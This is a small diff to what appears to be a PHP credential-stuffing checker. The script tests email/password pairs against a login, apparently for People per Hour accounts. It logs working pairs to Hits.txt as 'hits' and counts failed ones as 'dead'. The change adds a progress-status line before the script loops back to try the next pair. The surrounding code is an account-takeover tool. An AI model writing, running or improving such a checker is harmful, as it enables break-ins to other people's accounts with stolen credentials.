@@ -290,7 +290,9 @@ if(str_contains($response,'Wrong email or password.')){
         file_put_contents('Hits.txt',"---New People per Hour Hit---\n[+]Data: $user:$pass\n\n",FILE_APPEND);
         replaceOut("[+]Total Progress: ".show_status($total, $count)."\n[+]Dead: $fail\n[+]Hits Count: $hits\n");
  }else{
+  replaceOut("[+]Total Progress: ".show_status($total, $count)."\n[+]Dead: $fail\n[+]Hits Count: $hits\n");
  goto restart;
+  
  }
 }
 }
